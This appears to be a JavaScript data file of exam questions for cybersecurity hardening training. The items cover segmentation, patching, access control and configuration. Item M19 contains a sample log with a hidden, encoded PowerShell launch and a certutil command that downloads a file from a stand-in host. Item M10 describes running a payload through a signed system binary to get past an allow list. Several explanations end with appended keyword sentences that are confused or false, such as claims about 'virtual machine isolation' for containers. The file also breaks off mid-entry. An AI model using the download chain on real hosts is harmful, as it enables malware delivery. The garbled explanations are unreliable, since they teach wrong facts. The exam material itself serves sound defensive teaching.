window.EXAM_QUESTIONS = [{"id":"M01","type":"mcq","multi":false,"theme":"Segmentation and isolation","points":10,"scenario":"You are the analyst on duty at 14:05. Ticket INC-4481 lands in the queue: workstation FIN-WS-114, which sits in the Users VLAN, sent 4,120 connection attempts to TCP 445 on nine servers in the Server VLAN in the last ten minutes. Nothing else on the Users VLAN is talking to those servers tonight.","question":"Which single change removes this path for lateral movement and keeps normal file access working?","opts":["Turn up the switch logging so that the next internal scan is easier to review","Allow TCP 445 from the Users VLAN only in the normal business hours","Deny TCP 445 between the two VLANs, then allow only the one file server","Move the file servers into the Users VLAN so both sit in one segment"],"correct":[2],"whyEach":["Logging is a detective control. It shows the scan again next time but stops nothing.","A time limit still leaves the path open all day and does nothing at night.","A deny rule between the two segments removes the path, and the single exception keeps file access alive.","Moving the servers into the users segment brings the data next to every workstation and makes the problem worse."],"why":"The scan crossed from one segment to another, so the fix belongs at that boundary. A deny rule for TCP 445 between the Users VLAN and the Server VLAN removes the path for lateral movement, and one deliberate exception keeps business file access working. More logging would only describe the same traffic again. The deny rule is network segmentation in practice, and naming the one server that may still be reached is least privilege.","hint":"Ask yourself where the traffic crosses a boundary, and what must still work after you close it.","kw":["network segmentation","VLAN","access control list (ACL)","least privilege"]},{"id":"M02","type":"classify","theme":"Segmentation and isolation","points":12,"scenario":"Your team is writing the control map for the annual audit. Each action on the list has to be filed under the one mitigation area it mainly belongs to, so the auditor can see that every area is covered.","question":"Place each action in the mitigation area it mainly belongs to.","items":["Deny TCP 445 between the Users VLAN and the Server VLAN","Give one team read only permission on a single shared folder","Remove the unused web server role from the file server","Run a suspicious sample in a disposable virtual machine that is deleted after the test","Allow only signed applications to run on the endpoints","Write a rule for each workload so that only the report service may reach the database","Change the vendor default administrator password on the new switch","Keep a legacy medical device on its own network with no internet route"],"buckets":["Segmentation","Access control","Hardening","Isolation"],"answer":[0,1,2,3,1,0,2,3],"whyEach":["This is a boundary between two network segments, placed by an access control list.","This limits who may read a resource, which is an access control decision.","Taking away a service the host does not need is hardening, and it follows least functionality. Removing software the host does not need is removing unnecessary software, and the deny rule between the two VLANs is an access control list written for the network.","A throwaway virtual machine is sandboxing, a form of isolation.","An allow list decides which software may run, which is an access control rule.","A rule written for one workload instead of a whole subnet is microsegmentation, which is still a segmentation control.","Replacing a published default password is a hardening step on a device.","Cutting a device off from every other network is isolation, close to an air gap."],"why":"Each of these actions is useful, but they do different jobs. Segmentation puts a controlled boundary between networks or between single workloads, access control decides who may reach a resource, hardening removes weakness from the device itself, and isolation puts something risky where it cannot touch anything else.","hint":"Ask what the action limits: a boundary, a permission, the device itself, or the space it runs in.","kw":["network segmentation","microsegmentation","access control list (ACL)","least privilege","removing unnecessary software","sandboxing","virtual machine isolation","application allow list","default credential change","air gap","VLAN"]},{"id":"M03","type":"fill","theme":"Configuration enforcement","points":10,"scenario":"You are updating the build standard for the Windows server team. New servers are built from the approved image, and the document must name the settings and the process that keep every new host the same.","question":"Choose the word or phrase that completes each gap in the build standard.","parts":["Before a new server joins the domain, the build team applies the approved ",{"b":0},". The build then removes every service and role the server does not need, which follows the rule of ",{"b":1},". The first action after installation is to change the ",{"b":2}," on the management interface. After that the server joins the ",{"b":3}," cycle, so missing fixes are installed on a schedule instead of by hand."],"answers":["secure baseline","least functionality","default credentials","patch management"],"extras":["full-disk encryption","separation of duties","rule-based access control"],"why":"The secure baseline is the agreed set of settings that every host of this type must carry, and least functionality means the host keeps only the services its job needs. Default credentials from a vendor are public knowledge, so they must be changed on day one, and patch management keeps new fixes arriving on a schedule. Setting the vendor password to a private value is the default credential change, and the approved image with its settings is the golden image the team rebuilds from.","hint":"One gap is about the agreed settings, one about removing what is not needed, one about vendor passwords, one about fixes.","kw":["secure baseline","least functionality","default credential change","patch management","golden image"]},{"id":"M04","type":"order","theme":"Patching and vulnerability management","points":10,"scenario":"A critical fix for the file servers was released this morning. Your team owns the patch process for 120 Windows servers, and the runbook must be reissued in the correct order for the new engineers.","question":"Put the patch process steps in the order they must happen.","items":["Take an inventory of the servers and the builds they currently run","Scan the servers and rank the missing fixes by risk","Test the fix on a small pilot group of servers","Get the deployment approved through change management","Install the fix inside the agreed maintenance window","Verify the build number and keep the rollback plan ready"],"why":"You cannot patch what you have not listed, and you cannot rank risk before you know what is missing. A small pilot group shows whether the fix breaks anything, the change record makes the work approved and visible, and the maintenance window keeps the downtime agreed. Verification closes the loop, and the rollback plan is what saves you if the fix misbehaves. The scan step is an authenticated vulnerability scan, because it has to read the installed build from inside the host.","hint":"Start from knowing what you own, and end by proving the change worked.","kw":["patch management","patch prioritization","maintenance window","change management","rollback plan","authenticated vulnerability scan"]},{"id":"M05","type":"terminal","theme":"Hardening techniques","points":10,"scenario":"The file server fileserver01 is about to be hardened. Before you close the legacy SMB service, you must prove that TCP 445 is currently reachable on that host, so the change record has evidence.","question":"Use an nmap command to check whether TCP port 445 is open on fileserver01. Type the command in the terminal.","parts":[{"re":"\\bnmap\\b","label":"the command uses the nmap port scanner","flags":"i"},{"re":"(^|\\s)-p\\s*445(\\s|$)","label":"the scan is limited to TCP port 445","flags":""},{"re":"\\bfileserver01\\b","label":"the target host is fileserver01","flags":"i"}],"solution":"nmap -p 445 fileserver01","sample":"Starting Nmap 7.94 ( the version banner appears here )\nNmap scan report for fileserver01\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nNmap done: 1 host up","why":"A single port scan gives the evidence the change record needs without touching the rest of the host. The port flag keeps the scan narrow, which is both faster and quieter than a full scan, and naming the host makes the result repeatable. If the port is open and the service is not needed, that is a finding for least functionality. The policy itself is a host based firewall, the evidence goes into the asset inventory, and closing a service nobody needs is disabling unused ports and protocols.","hint":"Use the port scanner with its port flag, and name the host as the last argument.","kw":["disabling unused ports and protocols","least functionality","host-based firewall","asset inventory / CMDB"]},{"id":"M06","type":"spot","theme":"Hardening techniques","points":12,"scenario":"You are reviewing the host firewall policy of fileserver02 before it goes back into production. The policy was edited by three different engineers, and one line breaks the rule that only the two finance subnets may reach the file share.","question":"Click the line that must be changed before the server returns to service.","art":{"title":"host firewall policy - fileserver02 - last edited 2025-02-11 by t.haas","kind":"code","pick":true,"lines":["policy host-firewall FS02","allow  tcp  10[.]30[.]4[.]0/24  any  eq 445   ! finance subnet","allow  tcp  10[.]30[.]9[.]0/24  any  eq 445   ! audit subnet","allow  tcp  any  any  eq 3389   ! remote support, review later","deny   tcp  any  any  eq 23","deny   udp  any  any  eq 69","deny   ip   any  any         ! default deny"]},"bad":[3],"whyEach":["This is the policy header, not a rule, so it cannot be the finding.","The finance subnet is the intended caller for the file share, so this rule is correct.","The audit subnet has a documented need for read access, so this rule stands.","Remote Desktop is open from every address to every address. That exposes the server to the whole network and breaks the two subnet rule, and it is exactly the kind of default allow that hardening removes.","Blocking Telnet is correct and should stay.","Blocking the old Trivial File Transfer service is correct and should stay.","A default deny at the end is the right way to finish a firewall policy."],"why":"A host firewall policy must end with a default deny, and the rules above it are the only doors left open. The Remote Desktop rule opens a management port to every address, which is far wider than the two finance subnets the server is meant to serve. The correct fix is to delete that rule or restrict it to the two admin hosts on the jump box subnet. A rule list like this is an access control list for one host, and allowing only the jump box to manage it is least privilege applied to the management path. Deleting that rule is disabling unused ports and protocols on a host that never needed Remote Desktop.","hint":"Look for a rule whose source and destination are wider than the server needs.","kw":["host-based firewall","access control list (ACL)","disabling unused ports and protocols","least privilege","jump box / bastion host"]},{"id":"M07","type":"spot","theme":"Access control and least privilege","points":12,"scenario":"The monthly access review is open, and you were asked to support one finding with log evidence. The review noticed that a backup service account was used outside working hours. You must point at the two lines that prove the account was used to run commands as root at night.","question":"Click the two log lines that prove the finding.","art":{"title":"auth.log - server backup-01 - 2025-03-02 to 2025-03-03","kind":"log","pick":true,"lines":["2025-03-02T23:41:02Z sshd[2210]: Failed password for invalid user admin from 10[.]88[.]12[.]7 port 51422 ssh2","2025-03-02T23:41:19Z sshd[2211]: Failed password for invalid user test from 10[.]88[.]12[.]7 port 51430 ssh2","2025-03-02T23:44:07Z sshd[2214]: Failed password for invalid user oracle from 10[.]88[.]12[.]7 port 51488 ssh2","2025-03-03T01:02:11Z sshd[2245]: Accepted publickey for j.silva from 10[.]30[.]4[.]22 port 40112 ssh2","2025-03-03T03:12:44Z sshd[2288]: Accepted password for svc_backup from 10[.]30[.]7[.]19 port 33120 ssh2","2025-03-03T03:12:45Z sudo: svc_backup : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/backup.tgz /etc","2025-03-03T03:40:02Z sshd[2301]: Accepted publickey for j.silva from 10[.]30[.]4[.]22 port 40188 ssh2","2025-03-03T06:00:00Z CRON[2410]: (root) CMD (/usr/local/bin/rotate-logs.sh)"]},"bad":[4,5],"whyEach":["A failed login for a user name that does not exist is noise from the network scanner, not the finding.","Another failed login from the same outside address. It is worth blocking, but it shows no success.","A third failed attempt from the scanner. Failed attempts are not the review finding.","This is a normal key based login for a named engineer during her shift, so it is expected.","A password login for a service account at 03:12 is the first half of the finding. It shows interactive use of an account that should only be used by an automated job.","The sudo record completes the proof: the same service account ran a command as root. Together the two lines show interactive, privileged use at night.","A second normal key login for the same engineer. Nothing unusual here.","A scheduled job that runs as root every morning at 06:00. This is expected behaviour."],"why":"The finding needs proof that the account was used interactively and with privilege, not just that it exists. Line 5 shows a password login at 03:12, and line 6 shows the same account running tar as root minutes later. Failed logins from an outside address are noise here, and they belong to a different problem called brute force. The finding itself is a time-of-day restriction: the service account broke the working hours rule that should never have applied to a machine account at all.","hint":"A service account should not open a session by hand, and the proof gets stronger when privilege follows.","kw":["time-of-day restriction","service account","orphaned account","least privilege","privileged access management (PAM)","access review"]},{"id":"M08","type":"branch","theme":"Segmentation and isolation","points":12,"scenario":"You are the only analyst on the morning shift. At 09:12 the endpoint console raises a high alert on FIN-WS-114: a file named invoice_2024.exe was written to the user profile and then started cmd.exe. The user says she did not open anything unusual.","question":"Work through the response, one decision at a time.","steps":[{"sit":"The alert is two minutes old and the user is still logged in. What is your first action?","opts":["Delete the file with the antivirus console and close the alert","Isolate the workstation from the network with the endpoint agent","Call the user and ask her to stop working until you call back","Reboot the workstation into safe mode before doing anything else"],"correct":1,"res":["The file is deleted, but the running process keeps its own copy and the alert loses its evidence.","Containment cuts the host off from the network while the agent still talks to the console. The spread stops and the evidence stays on the disk and in memory.","The user stops working, but nothing stops the running code from talking to its operator or reaching other hosts.","A reboot destroys the memory image that shows how the code started and where it connected."]},{"sit":"The host is contained and the file hash is not on any block list yet. What do you do next?","opts":["Capture the running processes, the network connections and the file hash","Format the disk now so the user can get back to work quickly","Send the file to all staff as a warning example","Reconnect the host to the network to see what the code does next"],"correct":0,"res":["You keep the volatile evidence and the hash. The hash can then be used to hunt for the same file on the other 400 workstations.","Formatting destroys the evidence and the root cause is lost for good.","This spreads a live sample to hundreds of mailboxes and adds no control at all.","Reconnecting hands the attacker a working session again."]},{"sit":"Evidence is captured and the hash is now blocked on the whole endpoint fleet. The business wants the user online this morning. What is the correct recovery step?","opts":["Rebuild the workstation from the approved golden image and restore her documents","Delete the registry entries the code created and hand the host back","Keep the host contained until the software vendor replies to the ticket","Reinstall only the office suite and give the workstation back"],"correct":0,"res":["A rebuild from the known good image removes hidden persistence and returns a host the business can trust.","Manual cleanup often leaves persistence behind, and nobody can prove the host is clean.","The host stays quarantined and the user stays offline, while the host is still not trusted.","A partial reinstall does not remove persistence that lives outside the office suite."]}],"why":"The order is contain, keep the evidence, then rebuild. Containment with the endpoint agent stops the spread without destroying memory or disk evidence, which is exactly what deleting the file or rebooting would do. Recovery ends with a known good image, because manual cleaning cannot prove a host is clean. Containment is isolation at work, blocking the file hash is an application deny list, and taking away what let the file run is attack surface reduction.","hint":"Stop the spread first, save the proof second, and put a trusted build back last.","kw":["isolation","endpoint detection and response (EDR)","golden image","attack surface reduction","application deny list"]},{"id":"M09","type":"order","theme":"Patching and vulnerability management","points":10,"scenario":"The weekly vulnerability report lists five open findings and the maintenance window is only four hours long. Your team leader wants them ranked by the urgency of patching, from the one you fix first to the one you fix last.","question":"Rank the findings from the most urgent to the least urgent.","items":["Internet facing VPN appliance, remote code execution, listed in the CISA KEV catalog","Internet facing web server, cross site scripting, working exploit published last week","Internal file server, local privilege escalation, no public exploit and no known abuse","Internal print server, information disclosure, needs a local session on the host","Lab workstation, low impact issue, not reachable from the corporate network"],"why":"Urgency comes from exposure, impact and whether anyone is already using the flaw. A remote code execution bug on an internet facing appliance that appears in the CISA KEV catalog is being exploited now, so it goes first. A published exploit on an internet facing web server is next, then the internal privilege escalation, then the issue that needs a local session. The isolated lab host is last because reaching it already needs a foothold. This ranking is patch prioritization: the CVSS score, the KEV listing and the EPSS probability are read together, and a compensating control covers whatever cannot be fixed this week.","hint":"Combine how easy the target is to reach with how badly a success would hurt, and check whether anyone is already using it.","kw":["patch prioritization","CVSS","CISA KEV catalog","EPSS","compensating control"]},{"id":"M10","type":"dual","theme":"Access control and least privilege","points":12,"scenario":"The endpoint fleet of a design company now runs an application allow list. Only signed applications from the approved publisher list may start. You look at the same control from both sides of the fence.","question":"Answer once as the defender, then once as the attacker.","q1":{"q":"Blue team: what should you expect from the allow list on the first day?","opts":["Unsigned and unknown programs stop starting, and every block is logged","Every known malware family is removed from the disks automatically","Users can no longer open any document that arrives by email","The endpoint agent no longer needs any signature updates"],"correct":[0]},"q2":{"q":"Red team: the target only starts signed applications. Which action gives you the best chance to run your own code?","opts":["Rename the payload so it looks like a trusted program","Run the payload through a signed system binary that is already allowed","Compress the payload and start it from inside a zip file","Save the payload in the system folder and start it from there"],"correct":[1]},"why":"An allow list stops unknown binaries, but it does not stop the signed system tools that the business needs every day. Attackers therefore borrow those tools to run their own instructions, which is why the blue team must watch behaviour such as a signed binary starting a script, and not only the name of the file. An allow list is least privilege applied to software, and it is the cheapest attack surface reduction a fleet can buy.","hint":"One side asks what changes for the user, the other asks what is still allowed and can be misused.","kw":["application allow list","application deny list","least privilege","attack surface reduction"]},{"id":"M11","type":"mcq","multi":true,"theme":"Configuration enforcement","points":12,"scenario":"A new security manager asks your team for the list of actions that count as configuration enforcement on the server fleet, so the audit can show a control that keeps settings correct over time and not only on the day of the build.","question":"Which four actions are configuration enforcement?","opts":["Deploy a Group Policy that sets the firewall profile on every domain computer","Ask each administrator to set every single server up carefully from memory alone","Store the server build as code so that the same settings appear on each rebuild","Print the hardening policy and put a copy in every single server room and office","Compare the live settings of each host with the approved baseline each night","Let each user pick the security settings they prefer on their own laptop","Enrol the fleet in a mobile device management service that pushes the settings"],"correct":[0,2,4,6],"whyEach":["Correct. Group Policy pushes the agreed settings to every domain computer and keeps them there.","Wrong. Care and memory are not controls, and two engineers will build two different servers.","Correct. Infrastructure as code rebuilds the same host with the same settings every time.","Wrong. A printed policy is a document, not an enforced setting.","Correct. A nightly comparison with the baseline is how you find configuration drift.","Wrong. Personal choice is the opposite of an enforced standard.","Correct. A mobile device management service pushes and checks the standard settings on managed devices."],"why":"Configuration enforcement keeps the agreed settings in place without relying on people to remember them. Group Policy and mobile device management push settings, infrastructure as code rebuilds the same host each time, and a nightly comparison with the baseline detects drift. Advice on paper and personal preferences change nothing on the host. Pushing settings with Group Policy or a mobile device management service, rebuilding the host from code, and comparing it with the baseline are the three ways drift is prevented.","hint":"Look for the actions that push, rebuild or compare settings automatically.","kw":["Group Policy","mobile device management (MDM)","infrastructure as code (IaC)","secure baseline","configuration drift"]},{"id":"M12","type":"match","theme":"Hardening techniques","points":10,"scenario":"You are writing the hardening section of the new server and laptop standard. Each action in the left column has to be paired with the risk it removes, so readers understand why the setting exists.","question":"Match each hardening action with the risk it removes.","pairs":[["Turn off SMBv1 on the file servers","Lateral movement over an old file sharing protocol"],["Change the vendor default administrator password on the switches","Sign-in with credentials that are published in the manual"],["Encrypt the database columns that hold card numbers","Card data readable in a stolen database file"],["Turn on SMB signing on the servers","Relay and tampering of file share traffic"],["Enable measured boot with the firmware key store on new laptops","Boot level tampering with the operating system"],["Require TLS 1.2 or newer on the booking web service","Traffic that can be read or changed on the way"]],"why":"Every hardening action removes one specific path, and the standard explains that path instead of listing settings. Removing an old protocol closes the door that the protocol opened, changing published default credentials removes a way in that anyone can read from a manual, and encryption and signing protect the data and the traffic. Measured boot protects the start of the operating system before any security tool is loaded, and a current TLS version protects the traffic while it travels. Turning off SMBv1 is disabling unused ports and protocols, because an old protocol is an unused door.","hint":"For each action ask what an attacker would have done if the setting had stayed as it was.","kw":["disabling unused ports and protocols","default credential change","database encryption","SMB signing","secure boot","TLS"]},{"id":"M13","type":"fill","theme":"Segmentation and isolation","points":10,"scenario":"A small business is publishing an online booking service for the first time. You are asked to describe the network layout in the design document, using the standard security zones.","question":"Choose the word or phrase that completes each gap in the design.","parts":["The public web server sits in the ",{"b":0},". The database it uses stays in the ",{"b":1},", where only the web server may open a connection. Administrators reach both areas through a hardened ",{"b":2}," instead of from their own laptops, and the firewall between the areas begins with a ",{"b":3}," rule."],"answers":["DMZ","internal network segment","jump box","deny by default"],"extras":["user VLAN","public cloud tenant","flat network"],"why":"A DMZ holds the services that the internet has to reach, and the database stays behind a second boundary where the web server is the only caller. Administrators use a hardened jump box so their own laptops never sit on the server segment, and the firewall starts from deny by default so every opening must be justified. The rule between the two areas is an access control list, and the single flow from the web server to the database is least privilege.","hint":"One gap is the zone the internet may reach, one is where the data lives, one is the admin path, one is the rule at the bottom of the list.","kw":["DMZ","network segmentation","jump box / bastion host","access control list (ACL)","least privilege"]},{"id":"M14","type":"mcq","multi":false,"theme":"Access control and least privilege","points":10,"scenario":"A user in the finance team reports that she can open every folder on the shared volume FS02-DATA, including the payroll files that belong to the marketing share. The share permissions were copied from the parent volume when the volume was created, and all 900 staff are members of the broad domain users group.","question":"Which change follows least privilege and keeps the finance work running?","opts":["Replace the inherited permission with a finance role group on its folders","Add a deny rule for the marketing team on the single payroll folder","Move the payroll folder to a new volume that has no share permissions at all","Leave the permission in place and rely on the weekly access log review"],"correct":[0],"whyEach":["Correct. Replacing the inherited group access with a role group gives each team what its job needs and nothing more.","Wrong. One deny rule for one team still leaves the other 890 users with access.","Wrong. The folder becomes unusable for the team that owns it, and the design is not the problem.","Wrong. Log review tells you about the exposure after the fact and removes no access."],"why":"The whole company can read the volume because a broad group inherited access from the parent. Least privilege means each team reaches only its own data, so the inherited permission is replaced by a role based group. Denying access to one other team leaves the exposure in place for everyone else. The broad inherited access is discretionary access control, where the owner of the volume decides, and the fix replaces it with role based access control.","hint":"Ask who should have access, not who should be blocked.","kw":["least privilege","role-based access control (RBAC)","discretionary access control (DAC)","access review"]},{"id":"M15","type":"classify","theme":"Access control and least privilege","points":12,"scenario":"New analysts keep mixing up the access control models. You write a short training set in which each sentence describes one model, so the team can practise telling them apart before the audit interviews.","question":"Place each sentence under the access control model it describes.","items":["A file labelled SECRET can be opened only by a process that runs at the SECRET label","The owner of a project folder decides who else may read it","The help desk group receives the help desk permissions and nothing more","Sign-in is allowed only between 08:00 and 18:00 from the office network","A firewall rule permits TCP 443 to the web server from any address","A user needs the TOP SECRET label before reading a TOP SECRET document","Each team sets the sharing options on its own project folder","The payroll clerk is placed in the payroll role and receives payroll rights only"],"buckets":["MAC","DAC","RBAC","Rule-based access control"],"answer":[0,1,2,3,3,0,1,2],"whyEach":["Labels decide access here, not the owner, which is mandatory access control.","The owner decides, which is discretionary access control.","Permissions come from the job role, which is role based access control.","A condition such as the time of day is applied to everyone, which is a rule based decision.","A rule about addresses and ports is rule based access control, here enforced by the firewall.","The label on the user and on the document must match, which is mandatory access control.","The team that owns the folder sets the sharing, which is discretionary access control.","Rights follow the role, not the person, which is role based access control."],"why":"Mandatory access control lets a label decide, and no owner can override it. Discretionary access control lets the owner decide. Role based access control gives rights to a job role, and rule based access control applies a condition such as the time, the address or the port. Time of day restrictions are the classic rule based example, which is why the working hours sentence is a time-of-day restriction and not a role.","hint":"Ask who or what makes the decision: a label, an owner, a job role, or a condition.","kw":["mandatory access control (MAC)","discretionary access control (DAC)","role-based access control (RBAC)","rule-based access control","time-of-day restriction"]},{"id":"M16","type":"order","theme":"Lifecycle, sanitization and governance","points":10,"scenario":"The old file server FS02-OLD held finance documents and is being retired at the end of the month. You own the decommissioning record, and the auditor will check that the data cannot come back and that the asset register is correct.","question":"Put the decommissioning steps in the order they must happen.","items":["Confirm with the business owner that no application still uses the server","Copy the data that must be kept to the archive and check that the copy opens","Remove the server accounts, certificates and share permissions","Wipe or crypto erase every disk in the server","Record the sanitization result and obtain the certificate of destruction","Update the asset inventory and close the decommission record"],"why":"A server may only be retired when the owner agrees that nothing depends on it, and the data that must survive is copied and verified before anything is erased. Accounts and certificates are removed so the old identity cannot be reused, the disks are wiped or crypto erased, and the paperwork proves what happened. The asset register is updated last so it never shows a machine that no longer exists. The whole sequence is closed under change management, which is why the wipe record and the certificate are filed together.","hint":"Nothing may be erased before the business agrees and the keep list is safely copied.","kw":["decommissioning","data sanitization","cryptographic erase","certificate of destruction","asset inventory / CMDB","change management"]},{"id":"M17","type":"terminal","theme":"Hardening techniques","points":10,"scenario":"bastion01 is the jump host that administrators use to reach the server estate. The CIS Benchmark your team follows requires direct root login over SSH to be disabled, and the auditor wants the live value, not the file on disk.","question":"Use sshd -T together with grep to show the current value of the root login setting. Type the command in the terminal.","parts":[{"re":"\\bsshd\\s+-T\\b","label":"the live SSH server configuration is printed with sshd -T","flags":""},{"re":"\\bgrep\\b","label":"the output is filtered with grep","flags":""},{"re":"permitrootlogin","label":"the filter looks for the PermitRootLogin setting","flags":"i"}],"solution":"sshd -T | grep permitrootlogin","sample":"permitrootlogin no\nmaxauthtries 4\nlogingracetime 60","why":"Dumping the live configuration proves what the running service actually does, while reading the file on disk only shows what someone wrote there. Filtering that output for the root login setting gives the auditor one clean line for the change record. If it says yes, the host fails the benchmark and the fix is to switch to key based login for administrators and disable the root account as a login target. This is the secure baseline check for SSH key-only authentication, and it proves the old default credential change was really applied.","hint":"Dump the running SSH configuration, then filter it for the setting that controls root login.","kw":["SSH key-only authentication","secure baseline","CIS Benchmark","default credential change"]},{"id":"M18","type":"spot","theme":"Segmentation and isolation","points":12,"scenario":"A developer sends you a deployment manifest for the new invoice service. The platform team will run it on the shared cluster next week, and you must check it against the container isolation standard before it is approved.","question":"Click the line in the manifest that breaks container isolation and must be removed.","art":{"title":"deployment manifest - invoice-api - submitted by m.ferreira","kind":"code","pick":true,"lines":["apiVersion: apps/v1","kind: Deployment","metadata:","  name: invoice-api","spec:","  template:","    spec:","      containers:","        - name: api","          image: registry.local/invoice-api:2.4.1","          securityContext:","            privileged: true   # added so the app can read the host sensor","            runAsUser: 1000","            readOnlyRootFilesystem: true"]},"bad":[11],"whyEach":["The interface version is normal and is not a security finding.","The object kind is a Deployment, which is standard.","The metadata header is required by the format.","The workload name is fine.","The specification header is required.","The template header is required.","The pod specification header is required.","The container list header is required.","The container name is fine.","The image comes from the internal registry and is pinned to a version, which is good practice.","The security context block is the right place for hardening settings.","This is the finding. A privileged container can reach the host kernel and the other workloads, so the container wall around the service is gone. The comment shows the developer wanted host sensor data, which should be collected by an agent on the node instead.","Running as a normal user instead of root is correct and must stay.","A read only root file system is correct and limits what code inside the container can change."],"why":"Container isolation depends on the container not having host level rights. A privileged container can see the host devices and reach other workloads, so one bad setting removes the separation the whole platform relies on. The safe answer keeps the process as a normal user with a read only root file system, and collects host sensor data with a node agent instead. The workload is containerization, so the privileged flag removes both the sandboxing and the virtual machine isolation that should contain it, and running as a normal user is least privilege.","hint":"Look for the setting that gives the container the same power as a process on the node itself.","kw":["containerization","isolation","least privilege","sandboxing","virtual machine isolation"]},{"id":"M19","type":"spot","theme":"Hardening techniques","points":12,"scenario":"The endpoint console flagged a workstation in the finance team. You open the process view for FIN-WS-207 and must point at the two lines that show a document macro starting a hidden script that then downloaded a file.","question":"Click the two lines that show this chain of events.","art":{"title":"endpoint process log - FIN-WS-207 - 2025-04-08","kind":"log","pick":true,"lines":["2025-04-08T08:15:21Z EDR host FIN-WS-207 process outlook.exe pid 4100 user FIN\\a.moreau action start","2025-04-08T08:15:23Z EDR host FIN-WS-207 process winword.exe pid 4412 parent outlook.exe file Remittance_Advice.docm action open","2025-04-08T08:15:24Z EDR host FIN-WS-207 network winword.exe dst 10[.]88[.]12[.]7:443 action DENY rule web-block","2025-04-08T08:15:31Z EDR host FIN-WS-207 process powershell.exe pid 4622 parent winword.exe args -nop -w hidden -enc SQBFAFgA action start","2025-04-08T08:15:33Z EDR host FIN-WS-207 process certutil.exe pid 4700 parent powershell.exe args -urlcache -f hxxp://cdn-update[.]example/a.txt a.txt action start","2025-04-08T08:16:02Z EDR host FIN-WS-207 file C:\\Users\\a.moreau\\AppData\\Local\\Temp\\a.txt action create","2025-04-08T08:18:44Z EDR host FIN-WS-207 process Teams.exe pid 3220 user FIN\\a.moreau action start","2025-04-08T09:00:00Z EDR host FIN-WS-207 process svchost.exe pid 1188 service wuauserv action start"]},"bad":[3,4],"whyEach":["The mail client starting is normal and is only the parent of what follows.","Opening a .docm document from a mail attachment is worth noting, but on its own it is a normal user action.","This denied connection is a blocked attempt, not the download. It shows the web rule worked.","This is the first half of the finding: the word processor started a hidden, encoded PowerShell command. A document macro has no reason to launch a hidden script.","This is the second half: the script used a built in system tool to fetch a file from an external address. The two lines together show the full chain.","The created file is a result of the download, not the proof of how it arrived.","The chat client starting in the same minute is unrelated background noise.","A scheduled Windows update service is normal activity on any host."],"why":"A document that starts a hidden script, and a script that uses a built in system tool to fetch a file, is the classic macro chain. The defence is to block macros from internet files and to watch for office programs that start script interpreters. The blocked connection earlier proves the web rule fired but does not explain the chain. The durable answers are macro blocking and attack surface reduction, an application deny list for the downloaded tool, and a host based intrusion prevention system that refuses the network call.","hint":"Follow the parent process: who started whom, and what did the second one fetch.","kw":["macro blocking","attack surface reduction","endpoint detection and response (EDR)","application deny list","host-based intrusion prevention system (HIPS)"]},{"id":"M20","type":"order","theme":"Patching and vulnerability management","points":10,"scenario":"The vendor of the building access controller has announced that the unit reached end of support last month. No further fixes will be published, and the plant cannot replace it this year. Your manager wants the short term response described as a sequence.","question":"Put the short term response in the order it should happen.","items":["Move the controller onto its own segment with no route to the internet","Add a monitor only signature in front of its web interface to catch known exploit traffic","Write a time bound risk exception with the business owner and a review date","Agree a supported replacement date with the vendor","Add the replacement and the migration work to the next budget cycle"],"why":"The unit can no longer be fixed, so exposure comes down first and the device is isolated. Since it cannot be patched, the next best step is to watch for the traffic that attacks it. The written exception records the decision with a name and an end date, and only then does the long term work of agreeing a replacement and paying for it make sense. The unit is at end of support, so patch management can do nothing for it, and the isolation plus the monitor only signature are the compensating controls.","hint":"Reduce exposure and start watching before you sign paperwork about accepting the risk.","kw":["end-of-life / end-of-support","isolation","compensating control","risk acceptance","patch management"]},{"id":"M21","type":"mcq","multi":true,"theme":"Patching and vulnerability management","points":12,"scenario":"A production line controller runs an operating system that the vendor no longer supports. The plant cannot stop for a replacement this year, and the vulnerability scan shows 41 missing fixes that will never arrive. The plant manager asks what your team can do this week.","question":"Which three actions are valid compensating controls while the controller stays in service?","opts":["Close the finding as fixed because the software vendor has been told about it","Allow only the two engineering hosts to reach the controller interface","Put a virtual patching signature for the known exploit on the firewall","Turn off logging on the controller so the alert queue stays quiet","Move the controller onto its own segment with no internet route at all","Add the controller to the endpoint agent allow list for the plant"],"correct":[1,2,4],"whyEach":["Wrong. Telling the vendor changes nothing on the device, and the finding is still real.","Correct. Limiting who may reach the device is an access control list, and it removes most of the exposure.","Correct. Virtual patching does not fix the code, but it blocks the traffic that would use the flaw.","Wrong. Removing logging hides the problem and destroys the evidence you would need after an incident.","Correct. Cutting the internet route removes the easiest way in and is the strongest available control here.","Wrong. An endpoint agent on a controller would not stop network attacks, and the allow list does not cover this device."],"why":"A compensating control reduces risk when the real fix is not available. Restricting who can reach the device, blocking known exploit traffic with a virtual patch, and removing the internet route each reduce the chance of a successful attack. Closing a finding without a change on the device, or turning off logging, only hides the exposure. An asset at end of support cannot be patched, so isolation and the virtual patch carry the risk until the replacement arrives.","hint":"A compensating control must change something real on the network or the device, not the paperwork.","kw":["compensating control","virtual patching","access control list (ACL)","end-of-life / end-of-support","isolation","risk acceptance"]},{"id":"M22","type":"fill","theme":"Access control and least privilege","points":10,"scenario":"The payment services team is rewriting its internal control document after an audit comment. The document must name the access control rules that the team already follows in practice.","question":"Choose the word or phrase that completes each gap in the control document.","parts":["No single person may both create a supplier and approve the payment for it, which is the rule of ",{"b":0},". The administrator password for the core banking system is kept in the ",{"b":1}," and is released only for the length of the task. The vault asks the administrator for a second factor before it opens. Contractors may sign in only between 07:00 and 19:00 because of a ",{"b":2},". Each quarter the line managers must confirm that every account is still needed during an ",{"b":3},"."],"answers":["separation of duties","PAM vault","time-of-day restriction","access review"],"extras":["least privilege","job rotation","security awareness training"],"why":"Separation of duties means the person who starts a payment cannot be the person who approves it, so one account cannot complete a fraud alone. A privileged access management vault keeps the administrator password away from the people who use it, and the second factor it asks for means a stolen password alone is not enough. A time of day restriction limits when a contractor session may exist, and the quarterly access review is how the business proves that each account is still needed. The second factor the vault asks for is MFA, and it is what makes a stolen administrator password useless on its own.","hint":"Think about one person doing two jobs, a locked box for admin passwords with a second factor, working hours, and a regular check of accounts.","kw":["separation of duties","privileged access management (PAM)","MFA","time-of-day restriction","access review","least privilege"]},{"id":"M23","type":"match","theme":"Configuration enforcement","points":10,"scenario":"A new engineer joins the platform team and asks what each of the team artefacts is for. You write a short matching exercise for the onboarding pack so the terms stick.","question":"Match each artefact with what it gives the team.","pairs":[["Group Policy object","The same settings arrive on every domain computer"],["CIS Benchmark for Windows 11","A published list of secure settings to compare a host against"],["Signed golden image","A known good build used to rebuild a 